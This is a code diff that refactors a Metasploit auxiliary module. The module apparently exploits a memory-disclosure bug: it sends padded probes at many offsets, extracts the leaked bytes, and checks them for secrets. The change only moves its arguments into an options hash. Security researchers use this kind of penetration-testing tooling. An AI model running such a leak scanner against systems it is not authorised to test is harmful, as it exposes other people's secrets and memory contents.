@@ -586,7 +586,14 @@ class MetasploitModule < Msf::Auxiliary
           print_status("Progress: #{scanned}/#{total_offsets} (#{(scanned * 100.0 / total_offsets).round(1)}%) - #{unique_leaks.size} leaks found - ETA: #{remaining}s")
         end
 
-        found_leak = probe_and_extract(doc_len, reuse_conn, unique_leaks, all_leaked, secrets_found, leak_details, raw_responses)
+        found_leak = probe_and_extract(doc_len, {
+          reuse_conn: reuse_conn,
+          unique_leaks: unique_leaks,
+          all_leaked: all_leaked,
+          secrets_found: secrets_found,
+          leak_details: leak_details,
+          raw_responses: raw_responses
+        })
 
         if found_leak
           pass_leaks += 1
@@ -693,31 +700,31 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Probe a single offset and extract leaks
   #
-  def probe_and_extract(doc_len, reuse_conn, unique_leaks, all_leaked, secrets_found, leak_details, raw_responses)
-    response = send_probe(doc_len, doc_len + datastore['BUFFER_PADDING'], reuse_connection: reuse_conn)
+  def probe_and_extract(doc_len, opts = {})
+    response = send_probe(doc_len, doc_len + datastore['BUFFER_PADDING'], reuse_connection: opts[:reuse_conn])
     return false if response.nil? || response.empty?
 
     # Save raw response if enabled
-    raw_responses << response if datastore['SAVE_RAW_RESPONSES'] && raw_responses
+    opts[:raw_responses] << response if datastore['SAVE_RAW_RESPONSES'] && opts[:raw_responses]
 
     leaks = extract_leaks(response)
     found_new_leak = false
 
     leaks.each do |data|
-      next if unique_leaks.include?(data)
+      next if opts[:unique_leaks].include?(data)
 
-      unique_leaks.add(data)
-      all_leaked << data
+      opts[:unique_leaks].add(data)
+      opts[:all_leaked] << data
       found_new_leak = true
 
       # Store leak details for JSON export
-      leak_details << {
+      opts[:leak_details] << {
         offset: doc_len,
         length: data.length,
         data: data,
         printable: data.gsub(/[^[:print:]]/, '.'),
         timestamp: Time.now.utc.iso8601,
-        has_secret: check_secrets(data, doc_len, secrets_found)
+        has_secret: check_secrets(data, doc_len, opts[:secrets_found])
       }
 
       # Report large leaks or all if configured
